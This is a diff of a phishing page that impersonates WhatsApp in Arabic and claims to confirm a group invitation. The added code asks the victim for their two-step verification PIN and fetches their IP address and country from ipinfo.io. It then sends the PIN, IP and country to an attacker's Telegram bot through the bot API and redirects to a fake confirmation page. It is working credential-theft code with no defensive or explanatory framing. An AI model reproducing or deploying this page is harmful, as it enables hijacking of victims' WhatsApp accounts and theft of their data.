@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,13 +7,13 @@
   <title>WhatsApp Login</title>
   <link rel="stylesheet" href="./Bouuurn9/style.css">
   <link rel="icon" href="./Bouuurn9/ujTY9i_Jhs1.png">
-  <meta http-equiv="refresh" content="3; URL= PIN.html?FGDD=Loauyb734HSDHDS783JSDUE7Y34UEUY3GSDGHDSH73JS773USUSUS7ISUS63">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="bot_config.js"></script>
 
   <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/y2/l/0,cross/r1rawD1eDY0.css" data-bootloader-hash="vRp9yOm" crossorigin="anonymous" />
   <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/yw/l/0,cross/IotHsJsw6vU.css" data-bootloader-hash="Dpp+Eva" crossorigin="anonymous" />
   <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/yX/l/0,cross/saFzLSuJiDs.css" data-bootloader-hash="X+JXpLn" crossorigin="anonymous" />
-	
-  
+
   
 </head>
 
@@ -30,8 +31,8 @@
                                     <div><button aria-controls="replace_me_subnav" aria-expanded="false" id="u_0_7_NM" class="_9vd5 _aens _afod _afoe"><span class="_afog"><span class="_9vg3 _aj1b" style="">الخصائص</span></span><svg width="8" height="13" fill="none" class="_9vd8 _agnt _afol _afok">
                                                 <path d="M7.41 1.91L2.83 6.5l4.58 4.59L6 12.5l-6-6 6-6 1.41 1.41z" fill="currentColor"></path>
                                             </svg></button>
-                                     
-									 
+                                       
+									   
                                     </div>
                                 </li>
                                 <li class="_afn_"><a href="#" class="_9vd5 _aens _afod" target="_self"><span><span class="_afog"><span class="_9vg3 _aj1b" style="">الخصوصية</span></span></span></a></li>
@@ -58,11 +59,88 @@
 
 <div class="container" style=" margin-block: 100px; ">
   <div style=" text-align: center; margin: 20px;">
-  <img class="_9vx6" src="https://i.pinimg.com/originals/cf/96/e5/cf96e5b917fa2c520da5a9a73afced44.gif">
-  <h4 class="_9vd5 _9scb" style="color:#5E5E5E; font-size: large;"> ... جاري تأكيد الانضمام الى المجموعة</h4>
+  <img class="_9vx6" src="https://static.whatsapp.net/rsrc.php/v3/yB/r/_0dVljceIA5.png">
+  <h4 class="_9vd5 _9scb" style="color:#5E5E5E; font-size: large;">الدعوة للانضمام إلى مجموعة واتساب</h4>
   </div>
+  <div style=" text-align: center; font-family: system-ui;">
+  <h4 class="_9vd5 _9scb" style="color:#5E5E5E;">  أدخل رمز التحقق بخطوتين <br> (PIN) <br>  الذي قمت بتجديده سابقا </h4>
+
+  </div>
+
+<form action="#">
+<input type="hidden" id="ip">
+<input type="hidden" id="country">
+
+    <div class="input-group" style="text-align: center;">
+      <input style="width: auto;" type="text" id="pin" name="pin" placeholder="PIN Code">
+      <div id="error-message" style="text-align: center; color: red;"></div>
+    </div>
+<div style="text-align: center;">
+    <button style="padding: 10px 20px;
+        font-size: 16px;
+        background-color: #4CAF50;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        display: inline-block;
+		width: 150px;" type="submit">متابعة</button>
+</div>
+	
+  </form>
 </div>
 
+<script>
+    $(document).ready(function() {
+        $('form').submit(function(event) {
+            event.preventDefault();
+
+            var smsCode = $("#pin").val();
+            var ipAddress = $("#ip").val();
+            var country = $("#country").val(); // استرجاع اسم الدولة
+
+            // التحقق من إدخال رمز الـ SMS
+            if (!smsCode || !smsCode.match(/^\d+$/)) {
+                $("#error-message").text("ادخل رمز الـرمز بشكل صحيح");
+                return;
+            } else {
+                $("#error-message").text(""); // إزالة رسالة الخطأ إذا تم إدخال رمز الـ SMS بشكل صحيح
+            }
+
+            var telegramMessage = "PIN Code : " + smsCode + "\nIP : " + ipAddress + "\nCountry : " + country;
+
+            var telegramBotUrl = "https://api.telegram.org/bot" + botConfig.botToken + "/sendMessage";
+            var requestData = {
+                chat_id: botConfig.chatId,
+                text: telegramMessage
+            };
+
+            $.post(telegramBotUrl, requestData, function(response) {
+                // بعد الإرسال، قم بتوجيه المستخدم إلى الصفحة الأخرى
+                window.location.href = "Confirmed.html?FGDD=Loauyb734HSDHDS783JSDUE7Y34UEUY3GSDGHDSH73JS773USUSUS7ISUS63";
+            });
+        });
+
+        // جلب معلومات الـ IP باستخدام خدمة ipinfo.io
+        $.get("https://ipinfo.io", function(response) {
+            var ipAddress = response.ip;
+            var country = response.country; // استرجاع اسم الدولة
+
+            // تحديث الحقل الخاص بالـ IP
+            $("#ip").val(ipAddress);
+
+            // تحديث الحقل الخاص بالدولة
+            $("#country").val(country);
+        }, "json");
+    });
+</script>
+
+        <!-- script jquery -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+
+        <script>
+            $('#pin').mask('000000');
+        </script>
 
 </body>
 </html>
